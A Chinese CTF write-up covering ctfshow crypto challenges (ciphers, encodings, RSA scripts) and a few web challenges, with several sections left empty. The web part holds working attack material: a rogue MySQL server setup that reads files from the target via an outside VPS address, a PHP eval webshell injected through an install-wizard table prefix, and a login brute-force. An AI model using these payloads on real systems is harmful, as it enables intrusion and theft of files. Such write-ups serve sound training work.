# Crypto题

## 密码学签到

拿到题目：}wohs.ftc{galf，直接反转一下就是了

```
flag{ctf.show}
```



## crypto2

查看题目，老朋友了，直接放到浏览器控制台，这里截取部分题目

```
[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])
```

![image-20210609161808753](https://antlersmaskdown.oss-cn-hangzhou.aliyuncs.com/image-20210609161808753.png)

## crypto3

看题目，好家伙，我们需要拿**插件转个码（这里我用的是Charset）**，不然chrom默认就是乱码，转过码就是可爱的aaencode代码，我们找一个在线平台：https://www.qtool.net/decode

![image-20210609162022448](https://antlersmaskdown.oss-cn-hangzhou.aliyuncs.com/image-20210609162022448.png)

转码之后：

![image-20210609162927848](https://antlersmaskdown.oss-cn-hangzhou.aliyuncs.com/image-20210609162927848.png)

ok，解密完成！

![image-20210609163019561](https://antlersmaskdown.oss-cn-hangzhou.aliyuncs.com/image-20210609163019561.png)



## crypto4

简单的RSA

```
p=447685307 q=2037 e=17
```

写个解密脚本，求出d

```python
# 已知p、q、e,求d
import gmpy2
p =gmpy2.mpz(447685307)
q =gmpy2.mpz(2037 )
e =gmpy2.mpz(17)
phi_n= (p - 1) * (q - 1)
d = gmpy2.invert(e, phi_n)
print("flag{",d,"}")
```



## crypto5

简单的RSA

```
p=447685307 q=2037 e=17 c=704796792
```

写个解密脚本，求出m

```python
# 已知p、q、e、c ,求m
import gmpy2
p = 447685307
q = 2037
e = 17
c = 704796792
# 1.已知的p和q求出n
n = p * q
# 2.根据已知的条件求出d
phi_n = (p - 1) * (q - 1)
d = gmpy2.invert(e, phi_n)
# 3.求出明文
m = pow(c, d, n)
print("m=", m)
```



## crypto6

这里介绍一下，凡是AES/DES/3DES/Rabbit加密，都需要key密钥，且密文都是"U2FsdGVkX1”开头

```
密文：U2FsdGVkX19mGsGlfI3nciNVpWZZRqZO2PYjJ1ZQuRqoiknyHSWeQv8ol0uRZP94MqeD2xz+
密钥：加密方式名称
```

最后测试发现是Rabbit加密，密钥就是Rabbit



## crypto7

好长的Ook！啊~~~，[在线解密](https://www.splitbrain.org/services/ook)，来吧~ 复制粘贴，用Ook！to Text



## crypto8

和上一题一样，复制粘贴，用Brainfuck to Text就好了



## crypto9

经典题目，当看到题目没有提示的时候就要去找题目名称，题目给了serpent.zip，说明是一个蛇加密。zip是加密的，我们利用工具爆破一下，获得密钥。

![image-20210609190305629](https://antlersmaskdown.oss-cn-hangzhou.aliyuncs.com/image-20210609190305629.png)

之后拿蛇加密[在线工具](http://serpent.online-domain-tools.com/)解一下，这个密钥还是4132，成功获得flag

![image-20210609190424589](https://antlersmaskdown.oss-cn-hangzhou.aliyuncs.com/image-20210609190424589.png)



## crypto10

搜了一下，这个是Quoted-Printable Content-Transfer-Encoding编码方式，找个[解码平台](http://web.chacuo.net/charsetquotedprintable)，选择UTF-8进行解码，flag就是中文。

![image-20210609190933459](https://antlersmaskdown.oss-cn-hangzhou.aliyuncs.com/image-20210609190933459.png)



## crypto11

md5碰撞，工具：[输入让你无语的MD5](https://www.somd5.com/)，得到flag

```
ctf
```



## crypto0

我们凯撒一下

```
gmbh{ifmmp_dug}
```



## crypto12

查了一下，是埃特巴什码（Atbash Cipher）加密，它使用字母表中的最后一个字母代表第一个字母，倒数第二个字母代表第二个字母[解密网站](http://www.practicalcryptography.com/ciphers/classical-era/atbash-cipher/)

```
明文：A B C D E F G H I J K L M N O P Q R S T U V W X Y Z
密文：Z Y X W V U T S R Q P O N M L K J I H G F E D C B A
```

记住，对应关系需要大小写对应

```
uozt{Zgyzhv_xlwv_uiln_xguhsld}
flag{Atbase_code_from_ctfshow}
```



## crypto13

下载下来文档，文档名为base家族，打开文件应该为base64和base32的混合加密

```python
import base64
def base(s):
    try:
        s = base64.b32decode(s)
        s = base(s)
    except:
        try:
            s = base64.b64decode(s)
            s = base(s)
        except:
            return s
    return s
f = open('base.txt')
text = f.read()
print(base(text))
```



## crypto14

这道题很明显是一道二进制转成16进制，然后再转成字符串的题，但是这里会有一点不同，待会会说到。

转为字符串后得到，可以看到这个是base64，但是却转换不了

```
3EP/3VNFFmNEAnlHD5dCMmVHD5ad9uG
```

分析一下，我们知道的flag的格式肯定是flag{xxx}，所以**3EP/=flag**，但我们用flag经base64加密后的字符串是**ZmxhZw==**，最后查表发现**Zmxh**和**3EP**在base64表中查一下，Z和3差了30，m和E差了30。这下应该明白了吧。
写个脚本

```python
s= '3EP/3VNFFmNEAnlHD5dCMmVHD5ad9uG'
t = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/'
l=""
for i in s:
    l += t[(t.index(i)-30)%64]

if len(l)%4!=0:
    l=l+"="*(4-(len(l)%4))
print(l)
```



## 萌新_密码5

题目给了这个，发现是当铺密码，算法很简单，就是当前汉字有多少笔画出头，就是转化成数字几

```
由田中 由田井 羊夫 由田人 由中人 羊羊 由由王 由田中 由由大 由田工 由由由 由由羊 由中大
```

```
102 108 97 103 123 99 116 102 115 104 111 119 125
```

写个脚本

```python
n = '102 108 97 103 123 99 116 102 115 104 111 119 125'
n = n.split(' ')
x =''
for i in n:
    x+= chr(int(i))
print(x)
```



## 贝斯多少呢

```
8nCDq36gzGn8hf4M2HJUsn4aYcYRBSJwj4aE0hbgpzHb4aHcH1zzC9C3IL
```





## find the table

提示我们**审查元素**，F12查看后发现密文，再然后就想了很久，不像什么常规的加密方式，最后再看提示给的信息，马萨卡？元素周期表？

![image-20210611102037084](https://antlersmaskdown.oss-cn-hangzhou.aliyuncs.com/image-20210611102037084.png)

```
9 57 64 8 39 8 92 3 19 99 102 74
```

我们按元素周期表进行翻译

```
F La Gd O Y O U Li K Es No W
```

最后的flag，真的吐了！

```
FLaG{dOYOULiKEsNoW}
```



## easyrsa1-5

接下来RSA的题目就是跑脚本了，具体的参考：https://blog.csdn.net/weixin_43790779/article/details/108562895



## easyrsa6

**解题思路：** 因为p和q很相近，所以可以使用yafu分解n

```python
import gmpy2
import binascii
from Crypto.Util.number import getPrime

e = 0x10001
n = 26737417831000820542131903300607349805884383394154602685589253691058592906354935906805134188533804962897170211026684453428204518730064406526279112572388086653330354347467824800159214965211971007509161988095657918569122896402683130342348264873834798355125176339737540844380018932257326719850776549178097196650971801959829891897782953799819540258181186971887122329746532348310216818846497644520553218363336194855498009339838369114649453618101321999347367800581959933596734457081762378746706371599215668686459906553007018812297658015353803626409606707460210905216362646940355737679889912399014237502529373804288304270563
c = 18343406988553647441155363755415469675162952205929092244387144604220598930987120971635625205531679665588524624774972379282080365368504475385813836796957675346369136362299791881988434459126442243685599469468046961707420163849755187402196540739689823324440860766040276525600017446640429559755587590377841083082073283783044180553080312093936655426279610008234238497453986740658015049273023492032325305925499263982266317509342604959809805578180715819784421086649380350482836529047761222588878122181300629226379468397199620669975860711741390226214613560571952382040172091951384219283820044879575505273602318856695503917257

p = 163515803000813412334620775647541652549604895368507102613553057136855632963322853570924931001138446030409251690646645635800254129997200577719209532684847732809399187385176309169421205833279943214621695444496660249881675974141488357432373412184140130503562295159152949524373214358417567189638680209172147385801
q = 163515803000813412334620775647541652549604895368507102613553057136855632963322853570924931001138446030409251690646645635800254129997200577719209532684847732809399187385176309169421205833279943214621695444496660249881675974141488357432373412184140130503562295159152949524373214358417567189638680209172147385163
phi = (p-1)*(q-1)
d = gmpy2.invert(e,phi)
m = gmpy2.powmod(c,d,n)

print(binascii.unhexlify(hex(m)[2:]))
```



## easyrsa7

p损失掉了低位数据，用sagemath恢复p（自行安装windows版sagemath）

![在这里插入图片描述](https://antlersmaskdown.oss-cn-hangzhou.aliyuncs.com/20210227191655485.png)

得到

```
p=147305526294483975294006704928271118039370615054437206404408410848858740256154476278591035455064149531353089038270283281541411458250950936656537283482331598521457077465891874559349872035197398406708610440618635013091489698011474611145014167945729411970665381793142591665142813403717755897604710955779069313024
```

之后拿脚本跑一下就可以了



## easyrsa8

题目给了我们一个公钥（public.key），使用[在线工具](http://tool.chacuo.net/cryptrsakeyparse/)分解出n、e

```
e = 65537 (0x10001)

n = 10306247299477991196335954707897189353577589618180446614762218980226685668311143526740800444344046158260556585833057716406703213966249956775927205061731821632025483608182881492214855240841820024816859031176291364212054293818204399157346955465232586109199762630150640804366966946066155685218609638749171632685073
```

使用[factordb](http://www.factordb.com/)分解n

```
p = 97
q = 106249972159566919549855203174197828387397831115262336234662051342543151219702510584956705611794290291345944183845955839244363030579896461607496959399297130227066841321473005074379950936513608503266587950271044991876848389878395867601515004796212227929894460104645781488319246866661398816686697306692491058609
```

我们还需要写个脚本读取文件

```python
from Crypto.PublicKey import RSA
from Crypto.Cipher import PKCS1_OAEP
from numpy import long
import gmpy2
import binascii

public = RSA.importKey(open('public.key').read())
n = long(public.n)
e = long(public.e)
print(n)
print(e)
p = 97
q = 106249972159566919549855203174197828387397831115262336234662051342543151219702510584956705611794290291345944183845955839244363030579896461607496959399297130227066841321473005074379950936513608503266587950271044991876848389878395867601515004796212227929894460104645781488319246866661398816686697306692491058609
d = 4520639064487098151327174667961365516283539231992543792882057746866179464294032313887767783621724945557985447874376379715922452725597335427159165685648572663979688014560576024497341124412004366514253110547369977143739781801290219136578513871764574450392367530817034216313429071683911546803031169524669257788417
rsakey = RSA.importKey(open('public.key','r').read())
privatekey = RSA.construct((n,e,d,p,q))
rsa = PKCS1_OAEP.new(privatekey)
m = rsa.decrypt(open('flag.enc','rb').read())
print(m)
```



## funnyrsa1















## funnyrsa2



```python
import gmpy2
from Crypto.Util.number import long_to_bytes

e = 65537
n = 897607935780955837078784515115186203180822213482989041398073067996023639
p1 = 876391552113414716726089
p2 = 932470255754103340237147
p3 = 1098382268985762240184333
c = 490571531583321382715358426750276448536961994273309958885670149895389968
d = gmpy2.invert(e, (p1 - 1) * (p2 - 1) * (p3 - 1))
m = pow(c, d, n)
print(long_to_bytes(m))
```



















































































































































# CTFShow2021六月赛

## WEB

### baby_captcha

骚，典型折磨人的题目，是一道典型登录爆破题，我们拿到题目给到的[密码本](https://github.com/danielmiessler/SecLists/blob/master/Passwords/Common-Credentials/500-worst-passwords.txt)进行爆破。

最后爆破出密码为：fire，登录就有flag



### ctfshowcms

题目给了源码，我们下载进行分析

1. index.php存在一个任意的php文件包含，但因为php版本不是那么低，没法造成截断之类的，所以没法直接任意读。

   ```php
   $want = addslashes($_GET['feng']);
   $want = $want==""?"index":$want;
   
   include('files/'.$want.".php");
   ```

2. admin.php里没有利用，但是有比较微小的提示：

   ```php
   }else if($choice ==="giveMeTheYellowPicture"){
   	echo "http://127.0.0.1:3306/";
   ```

3. 提示了本地要利用数据库，在/install/index.php有安装锁的检测：

   ```php
   if(file_exists("installLock.txt")){
       echo "你已经安装了ctfshowcms，请勿重复安装。";
       exit;
   }
   ```

4. 这里用的是相对路径，直接安装的话没法二次安装。但是考虑到入口的index.php并不在install目录下，如果利用上面的文件包含，则可以利用路径的问题绕过安装锁的检测，进行二次安装。

5. 但这里存在一个数据库任意连接得问题，我们可以控制数据库连接的三个字段，可以构造一个恶意的mysql服务端来读取任意文件。[参考文章](https://www.modb.pro/db/51823)

   **简单来说，就是伪服务端来欺骗善良的客户端获得客户端主机上任意文件的过程**

   MySQL客户端与服务端的交互可以表示为一下对话：

   1. 客户端：把我我本地/data/test.csv的内容插入到TestTable表中去
   2. 服务端：请把你本地/data/test.csv的内容发送给我
   3. 客户端：好的，这是我本地/data/test.csv的内容：....
   4. 服务端：成功/失败

   正常情况下这个流程是没毛病的，但是前面我说了客户端在第二次并不知道它自己前面发送了什么给服务器，所以客户端第二次要发送什么文件完全取决于服务端，如果这个服务端不正常，就有可能发生如下对话：

   1. 客户端：把我我本地/data/test.csv的内容插入到TestTable表中去
   2. 服务端：请把你本地/etc/passwd的内容发送给我
   3. 客户端：好的，这是我本地/etc/passwd的内容：....
   4. 服务端：....随意了

6. **也就是说我们可以让网站连接任意的sql服务器。这时候我们可以搭建一个恶意服务器去读文件**

   这里我们用一个脚本，在自己vps上搭建一下：[python脚本](https://github.com/MorouU/rogue_mysql_server/blob/main/rogue_mysql_server.py)

   修改下里面的端口和要读的文件，端口改成3307，其他的也可以，只要不是3306。在vps上运行

   ![在这里插入图片描述](https://antlersmaskdown.oss-cn-hangzhou.aliyuncs.com/20210601223224928.png)

   接着post传值，数据库用户名和密码是自己vps上的

   ```
   user=1&password=1&dbhost=47.111.139.22:3307&dbuser=ctfchow&dbpwd=ctfchow&dbname=ctfchow&dbport=3307
   ```

   ![在这里插入图片描述](https://antlersmaskdown.oss-cn-hangzhou.aliyuncs.com/20210601223120713.png)

   最后获得flag

   ![image-20210608123733695](https://antlersmaskdown.oss-cn-hangzhou.aliyuncs.com/image-20210608123733695.png)



### 应该不难

这个是一个版本的cve漏洞，参考：https://www.dz-x.net/t/1017/1/1.html

我们在安装向导中，修改数据表前缀为：

```
x');@eval($_POST[a]);('
```

![image-20210608125045817](https://antlersmaskdown.oss-cn-hangzhou.aliyuncs.com/image-20210608125045817.png)

这样就在config/config_ucenter.php中已经写入了webshell

我们访问一下，发现成功利用

![image-20210608125429826](https://antlersmaskdown.oss-cn-hangzhou.aliyuncs.com/image-20210608125429826.png)

直接cat一下，获得flag

```
a=system('cat /flag');
```

详细漏洞说明参考：https://zhuanlan.zhihu.com/p/39793706



### baby_php













# 36D杯

## Ceypto

### 签到题

我们拿到题目，看到提示rot，我们就用rot47进行解密

```
W9@F0>:2?0D9:07=28X/3/TUW/o/7/PUo/ST7/T/6/R
(hou_mian_shi_flag)^b^%&(^@^f^!&@^$%f^%^e^#
```

后面提示为键盘密码，我们需要观察一下密码，都是键盘上的一排，所以我们需要转换为键盘上的顺序，再转字符串，写个python

```python
org_str = "!@#$%^&*()"
string = "^b^%&(^@^f^!&@^$%f^%^e^#"
res = ''

for i in string:
    if org_str.find(i)>-1:
        res += str(org_str.find(i) + 1)
    else:
        res += i

print('flag{'+bytes.decode(bytes.fromhex(res),encoding='utf-8')+'}')
```



### rsaEZ

根据公钥得到私钥

```
python solve.py --verbose --key public.key --private
```

